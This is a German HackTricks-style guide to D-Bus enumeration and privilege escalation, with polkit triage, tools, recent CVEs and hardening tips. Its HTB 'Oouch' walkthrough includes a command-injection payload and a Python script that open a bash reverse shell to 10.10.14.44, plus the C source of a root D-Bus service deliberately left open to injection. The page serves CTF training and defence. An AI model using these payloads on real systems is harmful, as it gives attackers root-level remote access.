# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI-Aufzählung**

D-Bus dient in Ubuntu-Desktopumgebungen als Vermittler für die Interprozesskommunikation (IPC). Unter Ubuntu laufen gleichzeitig mehrere Message-Busse: der Systembus, der hauptsächlich von **privilegierten Diensten genutzt wird, um systemweit relevante Dienste bereitzustellen**, und für jeden angemeldeten Benutzer ein Session-Bus, der nur für diesen Benutzer relevante Dienste bereitstellt. Der Fokus liegt hier vor allem auf dem Systembus, da er mit Diensten verknüpft ist, die mit höheren Privilegien (z. B. root) ausgeführt werden. Unser Ziel ist die Rechteausweitung. Die D-Bus-Architektur verwendet für jeden Session-Bus einen „Router“, der Client-Nachrichten anhand der von den Clients angegebenen Adresse an die entsprechenden Dienste weiterleitet.<sup>[[1]](#references)</sup>

Dienste auf D-Bus werden durch die **Objekte** und **Schnittstellen** definiert, die sie bereitstellen. Objekte lassen sich mit Klasseninstanzen in gängigen OOP-Sprachen vergleichen; jede Instanz wird durch einen eindeutigen **Objektpfad** identifiziert. Dieser Pfad ähnelt einem Dateisystempfad und identifiziert jedes vom Dienst bereitgestellte Objekt eindeutig. Eine wichtige Schnittstelle für die Untersuchung ist **org.freedesktop.DBus.Introspectable**. Sie verfügt über eine einzelne Methode namens Introspect. Diese Methode gibt eine XML-Darstellung der vom Objekt unterstützten Methoden, Signale und Eigenschaften zurück. Hier konzentrieren wir uns auf die Methoden und lassen Eigenschaften und Signale außer Acht.

Für die Kommunikation mit der D-Bus-Schnittstelle wurden zwei Tools verwendet: das CLI-Tool **gdbus**, mit dem sich von D-Bus bereitgestellte Methoden einfach in Skripten aufrufen lassen, und [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ein GUI-Tool auf Python-Basis, mit dem sich die auf jedem Bus verfügbaren Dienste aufzählen und die in den einzelnen Diensten enthaltenen Objekte anzeigen lassen.

```bash
sudo apt-get install d-feet
```

Wenn du den **Session-Bus** überprüfst, bestätige zuerst die aktuelle Adresse:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Im ersten Bild sind die beim D-Bus-Systembus registrierten Dienste zu sehen. **org.debin.apt** ist hervorgehoben, nachdem die Schaltfläche „System Bus“ ausgewählt wurde. D-Feet fragt diesen Dienst nach Objekten ab und zeigt die Schnittstellen, Methoden, Eigenschaften und Signale der ausgewählten Objekte an, wie im zweiten Bild zu sehen. Auch die Signatur jeder Methode wird angezeigt.

Besonders nützlich ist, dass die **Prozess-ID (pid)** und die **Befehlszeile** des Dienstes angezeigt werden. So lässt sich feststellen, ob der Dienst mit erhöhten Rechten ausgeführt wird – wichtig für die Relevanz der Untersuchung.

**Mit D-Feet lassen sich auch Methoden aufrufen**: Benutzer können Python-Ausdrücke als Parameter eingeben, die D-Feet vor der Übergabe an den Dienst in D-Bus-Typen umwandelt.

Beachten Sie jedoch, dass **für einige Methoden eine Authentifizierung erforderlich ist**, bevor wir sie aufrufen können. Diese Methoden lassen wir außer Acht, da unser Ziel von vornherein darin besteht, unsere Rechte ohne Zugangsdaten auszuweiten.

Beachten Sie außerdem, dass einige Dienste einen anderen D-Bus-Dienst namens org.freedeskto.PolicyKit1 abfragen, ob ein Benutzer bestimmte Aktionen ausführen darf.

## **Befehlszeilen-Aufzählung**

### Dienstobjekte auflisten

Es ist möglich, geöffnete D-Bus-Schnittstellen mit folgendem Befehl aufzulisten:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Dienste mit der Kennzeichnung **`(activatable)`** sind besonders interessant, da sie **noch nicht laufen**, aber durch eine Bus-Anfrage bei Bedarf gestartet werden können. Beschränke dich nicht auf `busctl list`; ordne diese Namen den tatsächlich ausgeführten Binärdateien zu.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Das zeigt schnell, welcher `Exec=`-Pfad für einen aktivierbaren Namen gestartet wird und unter welcher Identität. Ist die Binärdatei oder ihre Ausführungskette nur schwach geschützt, kann ein inaktiver Dienst dennoch als Privilege-Escalation-Pfad dienen.

Ordne bei einem privilegierten USB-Imaging-Dienst seinen Systembusnamen der **effektiven** Richtlinie für seine Aktion zum Schreiben von Images zu. Eine veraltete Herstellerregel kann einer administrativen Unix-Gruppe `ResultActive=yes` ohne Passwortabfrage gewähren. Prüfe, ob das aktuelle Konto zu dieser Gruppe gehört, die Sitzung aktiv ist, die Regel tatsächlich geladen und nicht überschrieben wurde und der installierte Helfer weiterhin vom Aufrufer ausgewählte Quell- und Zielpfade akzeptiert. Der Dienste-Deskriptor oder eine alte Paketversion allein belegen keinen beliebigen Dateizugriff. Ein fehlender Aktivierungsdeskriptor schließt auch einen bereits laufenden Dienst nicht aus. Untersuche fest vorgegebene Richtlinien- und Dienstdateien, ohne die Methode zum Schreiben von Images aufzurufen; siehe die [ursprüngliche Dienstanalyse](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Verbindungen

[Aus Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wenn ein Prozess eine Verbindung zu einem Bus herstellt, weist der Bus der Verbindung einen speziellen Busnamen namens _eindeutiger Verbindungsname_ zu. Busnamen dieses Typs sind unveränderlich – es ist garantiert, dass sie sich nicht ändern, solange die Verbindung besteht. Noch wichtiger ist, dass sie während der Lebensdauer des Busses nicht erneut vergeben werden können. Das bedeutet, dass keiner anderen Verbindung zu diesem Bus jemals derselbe eindeutige Verbindungsname zugewiesen wird, selbst wenn derselbe Prozess die Verbindung zum Bus schließt und eine neue erstellt. Eindeutige Verbindungsnamen sind leicht zu erkennen, da sie mit dem ansonsten unzulässigen Doppelpunkt beginnen.<sup>[[4]](#references)</sup>

### Informationen zum Dienstobjekt

Anschließend kannst du mit Folgendem Informationen zur Schnittstelle abrufen:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Ordne außerdem den Busnamen der zugehörigen `systemd`-Unit und dem Pfad der ausführbaren Datei zu:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Dies beantwortet die operative Frage, die bei privesc zählt: **Welche tatsächliche Binärdatei und welche Unit führen die Aktion aus, wenn ein Methodenaufruf erfolgreich ist?**

### Schnittstellen eines Serviceobjekts auflisten

Du benötigst ausreichende Berechtigungen.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Schnittstelle eines Service-Objekts introspektieren

Beachte, dass in diesem Beispiel die zuletzt entdeckte Schnittstelle mithilfe des Parameters `tree` ausgewählt wurde (_siehe vorherigen Abschnitt_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Beachte die Methode `.Block` des Interfaces `htb.oouch.Block` (an der wir interessiert sind). Das „s“ in den anderen Spalten könnte bedeuten, dass ein String erwartet wird.

Bevor du etwas Gefährliches ausprobierst, teste zuerst eine **leseorientierte** oder anderweitig risikoarme Methode. So lassen sich drei Fälle sauber unterscheiden: falsche Syntax, erreichbar, aber verweigert, oder erreichbar und erlaubt.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### D-Bus-Methoden mit Richtlinien und Aktionen abgleichen

Die Introspektion zeigt dir, **was** du aufrufen kannst, aber nicht, **warum** ein Aufruf erlaubt oder verweigert wird. Für eine echte Privesc-Triage musst du in der Regel **drei Ebenen gemeinsam** untersuchen:

1. **Aktivierungsmetadaten** (`.service`-Dateien oder `SystemdService=`), um herauszufinden, welche Binärdatei und welche Unit tatsächlich ausgeführt werden.
2. **D-Bus-XML-Richtlinien** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), um zu erfahren, wer `own`, `send_destination` oder `receive_sender` verwenden darf.
3. **Polkit-Aktionsdateien** (`/usr/share/polkit-1/actions/*.policy`), um das standardmäßige Autorisierungsmodell zu ermitteln (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Nützliche Befehle:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** davon ausgehen, dass eine D-Bus-Methode immer genau einer Polkit-Aktion zugeordnet ist. Dieselbe Methode kann je nach geändertem Objekt oder Laufzeitkontext eine andere Aktion auswählen. Der praktische Ablauf ist daher:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` und die relevanten `.policy`-Dateien mit grep durchsuchen
3. risikoarme Live-Probes mit `busctl call`, `gdbus call` oder `dbusmap --enable-probes --null-agent`

Proxy- oder Kompatibilitätsdienste verdienen besondere Aufmerksamkeit. Ein **als root laufender Proxy**, der Anfragen über seine eigene, zuvor aufgebaute Verbindung an einen anderen D-Bus-Dienst weiterleitet, kann dazu führen, dass der Backend-Dienst jede Anfrage als von UID 0 stammend behandelt, sofern die Identität des ursprünglichen Aufrufers nicht erneut überprüft wird.<sup>[[3]](#references)</sup>

### Überwachungs-/Mitschnittschnittstelle

Mit ausreichenden Berechtigungen (die Berechtigungen `send_destination` und `receive_sender` allein reichen nicht aus) kannst du **eine D-Bus-Kommunikation überwachen**.

Um eine **Kommunikation zu überwachen**, musst du **root** sein. Wenn du als root weiterhin Probleme hast, lies [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) und [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Wenn du weißt, wie man eine D-Bus-Konfigurationsdatei so einrichtet, dass **nicht-root-Benutzer die Kommunikation mitschneiden dürfen**, **kontaktiere mich**!

Verschiedene Möglichkeiten zur Überwachung:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

Im folgenden Beispiel wird die Schnittstelle `htb.oouch.Block` überwacht und **die Nachricht "**_**lalalalal**_**" wird durch eine Fehlkommunikation gesendet**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Sie können `capture` anstelle von `monitor` verwenden, um die Ergebnisse in einer **pcapng**-Datei zu speichern, die Wireshark öffnen kann:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Alles Rauschen herausfiltern <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Wenn es auf dem Bus einfach zu viele Informationen gibt, übergib eine Match-Regel wie diese:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Mehrere Regeln können angegeben werden. Wenn eine Nachricht einer _beliebigen_ der Regeln entspricht, wird sie ausgegeben. Zum Beispiel:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Weitere Informationen zur Syntax von Match-Regeln finden Sie in der [D-Bus-Dokumentation](http://dbus.freedesktop.org/doc/dbus-specification.html).<sup>[[7]](#references)</sup>

### Mehr

`busctl` bietet noch weitere Optionen. [**Hier finden Sie alle**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Verwundbares Szenario**

Als Benutzer **qtc auf dem Host „oouch“ von HTB** finden Sie eine **unerwartete D-Bus-Konfigurationsdatei** unter _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Beachte aus der vorherigen Konfiguration, dass du der Benutzer `root` oder `www-data` sein musst, um über diese D-BUS-Kommunikation Informationen zu senden und zu empfangen.

Als Benutzer **qtc** im Docker-Container **aeb4525789d8** findest du in der Datei _/code/oouch/routes.py_ Code, der mit D-BUS zu tun hat. Das ist der interessante Code:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Wie du sehen kannst, wird eine Verbindung zu einer **D-Bus-Schnittstelle hergestellt** und der Funktion **"Block"** wird "client_ip" übergeben.

Auf der anderen Seite der D-Bus-Verbindung läuft eine kompilierte C-Binärdatei. Dieser Code **lauscht** auf der D-Bus-Verbindung **auf eine IP-Adresse und ruft iptables über die Funktion `system` auf**, um die angegebene IP-Adresse zu blockieren.\
**Der Aufruf von `system` ist absichtlich anfällig für Command Injection**, daher erzeugt eine Payload wie die folgende eine Reverse Shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Am Ende dieser Seite findest du den **vollständigen C-Code der D-Bus-Anwendung**. Darin kannst du in den Zeilen 91–97 nachsehen, **wie der `D-Bus object path`** **und der `interface name`** **registriert werden**. Diese Information wird benötigt, um Daten an die D-Bus-Verbindung zu senden:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Außerdem kannst du in Zeile 57 sehen, dass **die einzige registrierte Methode** für diese D-Bus-Kommunikation `Block` heißt (_**Deshalb werden im folgenden Abschnitt die Payloads an das Service-Objekt `htb.oouch.Block`, das Interface `/htb/oouch/Block` und die Methode `Block` gesendet**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Der folgende Python-Code sendet die Payload über `block_iface.Block(runme)` an die `Block`-Methode der D-Bus-Verbindung (_beachte, dass er aus dem vorherigen Codeabschnitt extrahiert wurde_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl und dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` ist ein Tool zum Senden von Nachrichten an den „Message Bus“.
- Message Bus – Eine Software, die Systeme verwenden, um die Kommunikation zwischen Anwendungen zu erleichtern. Das ist mit einer Message Queue verwandt (Nachrichten werden der Reihe nach sortiert), aber beim Message Bus werden Nachrichten nach einem Subscription-Modell gesendet und außerdem sehr schnell übertragen.
- Das Tag „-system“ gibt an, dass es sich um eine Systemnachricht und nicht um eine Sitzungsnachricht handelt (Standard).
- Das Tag „–print-reply“ gibt unsere Nachricht passend aus und empfängt etwaige Antworten in einem menschenlesbaren Format.
- „–dest=Dbus-Interface-Block“ ist die Adresse der Dbus-Schnittstelle.
- „–string:“ – Der Nachrichtentyp, den wir an die Schnittstelle senden möchten. Es gibt mehrere Formate zum Senden von Nachrichten, z. B. double, bytes, booleans, int und objpath. Davon ist „object path“ nützlich, wenn wir einen Dateipfad an die Dbus-Schnittstelle senden möchten. In diesem Fall können wir eine spezielle Datei (FIFO) verwenden, um der Schnittstelle einen Befehl unter dem Namen einer Datei zu übergeben. „string:;“ – Damit wird der object path erneut aufgerufen, an dem wir die FIFO-Datei/den Befehl für die Reverse Shell platzieren.

_Hinweis: In `htb.oouch.Block.Block` verweist der erste Teil (`htb.oouch.Block`) auf das Service-Objekt und der letzte Teil (`.Block`) auf den Methodennamen._

### C-Code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Automatisierte Enumeration-Helfer (2023-2025)

Die manuelle Enumeration einer großen D-Bus-Angriffsfläche mit `busctl`/`gdbus` wird schnell mühsam. Zwei kleine FOSS-Utilities, die in den letzten Jahren veröffentlicht wurden, können bei Red-Team- oder CTF-Einsätzen Zeit sparen:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* In C geschrieben; einzelnes statisches Binary (<50 kB), das jeden Objektpfad durchläuft, das `Introspect`-XML abruft und es der zugehörigen PID/UID zuordnet.<sup>[[5]](#references)</sup>
* Nützliche Flags:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Das Tool markiert ungeschützte Well-Known Names mit `!` und zeigt sofort Dienste an, die du *übernehmen* kannst, oder Methodenaufrufe, die von einer nicht privilegierten Shell aus erreichbar sind.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Ein reines Python-Skript, das nach *beschreibbaren* Pfaden in systemd-Units **und** übermäßig permissiven D-Bus-Policy-Dateien sucht (z. B. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Schnelle Verwendung:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Das D-Bus-Modul durchsucht die folgenden Verzeichnisse und hebt alle Services hervor, die von einem normalen Benutzer gefälscht oder übernommen werden können:
  * `/etc/dbus-1/system.d/` und `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (Vendor-Overrides)

---

## Bemerkenswerte D-Bus-Privilege-Escalation-Bugs (2024–2025)

Ein Blick auf kürzlich veröffentlichte CVEs hilft dabei, ähnliche unsichere Muster in benutzerdefiniertem Code zu erkennen. Zwei gute aktuelle Beispiele sind:<sup>[[2]](#references)[[3]](#references)</sup>

| Jahr | CVE | Komponente | Ursache | Offensive Lektion |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Der als root laufende Service stellte eine D-Bus-Schnittstelle bereit, die nicht privilegierte Benutzer umkonfigurieren konnten, einschließlich des Ladens von durch Angreifer kontrolliertem Makroverhalten. | Wenn ein Daemon **Geräte-/Profil-/Konfigurationsverwaltung** über den Systembus bereitstellt, sollten beschreibbare Konfigurationen und Makrofunktionen als Codeausführungsprimitive behandelt werden, nicht bloß als „Einstellungen“. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Ein als root laufender Kompatibilitäts-Proxy leitete Anfragen an Backend-Services weiter, ohne den Sicherheitskontext des ursprünglichen Aufrufers beizubehalten. Dadurch vertrauten die Backends dem Proxy als UID 0. | **Proxy-/Bridge-/Kompatibilitäts**-D-Bus-Services sollten als eigene Bug-Klasse behandelt werden: Wenn sie privilegierte Aufrufe weiterleiten, muss überprüft werden, wie die UID des Aufrufers bzw. der Polkit-Kontext das Backend erreichen. |

Zu beachtende Muster:
1. Der Service läuft **als root auf dem Systembus**.
2. Entweder gibt es **keine Autorisierungsprüfung**, oder die Prüfung erfolgt für das **falsche Subjekt**.
3. Die erreichbare Methode verändert schließlich den Systemzustand: Paketinstallation, Benutzer-/Gruppenänderungen, Bootloader-Konfiguration, Geräteprofil-Updates, Dateischreibvorgänge oder direkte Befehlsausführung.

Verwende `dbusmap --enable-probes` oder manuelle `busctl call`-Aufrufe, um zu bestätigen, ob eine Methode erreichbar ist. Untersuche anschließend die Policy-XML des Services und die Polkit-Aktionen, um zu verstehen, **welches Subjekt** tatsächlich autorisiert wird.

---

## Hardening & Erkennung: schnelle Maßnahmen

* Suche nach Richtlinien mit weltweiten Schreibrechten oder offenen *send/receive*-Berechtigungen:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Für gefährliche Methoden Polkit voraussetzen – selbst *root*-Proxies sollten die PID des *Aufrufers* an `polkit_authority_check_authorization_sync()` übergeben, nicht ihre eigene.
* In dauerhaft laufenden Hilfsprozessen die Rechte abgeben (mit `sd_pid_get_owner_uid()` nach dem Verbinden mit dem Bus die Namespaces wechseln).
